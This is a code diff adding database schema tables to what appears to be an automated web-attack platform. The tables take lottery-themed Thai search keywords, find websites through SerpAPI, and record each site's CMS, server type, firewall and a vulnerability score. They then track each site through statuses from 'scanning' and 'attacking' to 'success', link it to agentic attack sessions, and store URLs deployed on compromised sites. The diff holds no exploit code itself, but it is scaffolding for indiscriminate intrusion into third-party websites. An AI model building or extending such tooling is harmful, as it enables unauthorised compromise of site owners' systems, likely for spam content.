@@ -1610,3 +1610,70 @@ export const attackBlacklist = mysqlTable("attack_blacklist", {
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
 });
+
+
+// ═══════════════════════════════════════════════
+// SerpAPI Keyword Target Discovery — Lottery keyword-based target finding
+// ═══════════════════════════════════════════════
+export const serpKeywords = mysqlTable("serp_keywords", {
+  id: int("id").autoincrement().primaryKey(),
+  keyword: varchar("keyword", { length: 512 }).notNull(),
+  category: varchar("category", { length: 128 }).default("lottery").notNull(),
+  language: varchar("language", { length: 16 }).default("th").notNull(),
+  country: varchar("country", { length: 16 }).default("th").notNull(),
+  isActive: boolean("isActive").default(true).notNull(),
+  lastSearchedAt: timestamp("lastSearchedAt"),
+  totalSearches: int("totalSearches").default(0).notNull(),
+  totalTargetsFound: int("totalTargetsFound").default(0).notNull(),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+});
+export type SerpKeyword = typeof serpKeywords.$inferSelect;
+export type InsertSerpKeyword = typeof serpKeywords.$inferInsert;
+
+export const serpDiscoveredTargets = mysqlTable("serp_discovered_targets", {
+  id: int("id").autoincrement().primaryKey(),
+  domain: varchar("domain", { length: 512 }).notNull(),
+  url: text("url").notNull(),
+  title: text("title"),
+  snippet: text("snippet"),
+  serpPosition: int("serpPosition"),                          // Position in SERP results
+  keyword: varchar("keyword", { length: 512 }).notNull(),    // Which keyword found this
+  keywordId: int("keywordId"),                                // FK to serp_keywords
+  // Target analysis
+  cms: varchar("cms", { length: 64 }),
+  serverType: varchar("serverType", { length: 128 }),
+  waf: varchar("waf", { length: 128 }),
+  vulnScore: int("vulnScore"),
+  // Attack status
+  status: mysqlEnum("sdtStatus", [
+    "discovered", "queued", "scanning", "attacking", "success", "failed", "blacklisted", "skipped"
+  ]).default("discovered").notNull(),
+  attackSessionId: int("attackSessionId"),                    // FK to agentic_sessions
+  attackedAt: timestamp("attackedAt"),
+  attackResult: text("attackResult"),
+  deployedUrls: json("deployedUrls").$type<string[]>(),
+  // Metadata
+  discoveredAt: timestamp("discoveredAt").defaultNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+});
+export type SerpDiscoveredTarget = typeof serpDiscoveredTargets.$inferSelect;
+export type InsertSerpDiscoveredTarget = typeof serpDiscoveredTargets.$inferInsert;
+
+export const serpSearchRuns = mysqlTable("serp_search_runs", {
+  id: int("id").autoincrement().primaryKey(),
+  status: mysqlEnum("ssrStatus", ["running", "completed", "error", "cancelled"]).default("running").notNull(),
+  keywordsSearched: int("keywordsSearched").default(0).notNull(),
+  totalKeywords: int("totalKeywords").default(0).notNull(),
+  rawResultsFound: int("rawResultsFound").default(0).notNull(),
+  uniqueDomainsFound: int("uniqueDomainsFound").default(0).notNull(),
+  newTargetsAdded: int("newTargetsAdded").default(0).notNull(),
+  duplicatesSkipped: int("duplicatesSkipped").default(0).notNull(),
+  blacklistedSkipped: int("blacklistedSkipped").default(0).notNull(),
+  errors: json("errors").$type<string[]>(),
+  startedAt: timestamp("startedAt").defaultNow().notNull(),
+  completedAt: timestamp("completedAt"),
+  triggeredBy: varchar("triggeredBy", { length: 64 }).default("manual").notNull(), // manual, scheduler, daemon
+});
+export type SerpSearchRun = typeof serpSearchRuns.$inferSelect;
+export type InsertSerpSearchRun = typeof serpSearchRuns.$inferInsert;
